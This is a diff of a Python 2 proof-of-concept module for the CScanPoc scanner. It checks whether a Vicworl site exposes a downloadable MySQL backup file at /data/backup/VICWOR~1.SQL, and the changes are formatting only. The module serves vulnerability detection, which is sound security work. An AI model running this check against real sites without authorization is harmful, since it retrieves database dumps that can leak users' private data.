@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Vicworl_0001'  # 平台漏洞编号，留空
     name = 'Vicworl /VICWOR~1.SQL 数据库备份文件下载'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'Vicworl'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'e239710f-ac0b-427b-bcb0-941dd84979da'
     author = 'cscan'  # POC编写者
@@ -31,18 +33,19 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #http://www.wooyun.org/bugs/wooyun-2010-0106292
+            # http://www.wooyun.org/bugs/wooyun-2010-0106292
             verify_url = ('%s/data/backup/VICWOR~1.SQL') % self.target
             req = requests.get(verify_url)
             if req.status_code == 200 and 'MySQL dump' in req.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
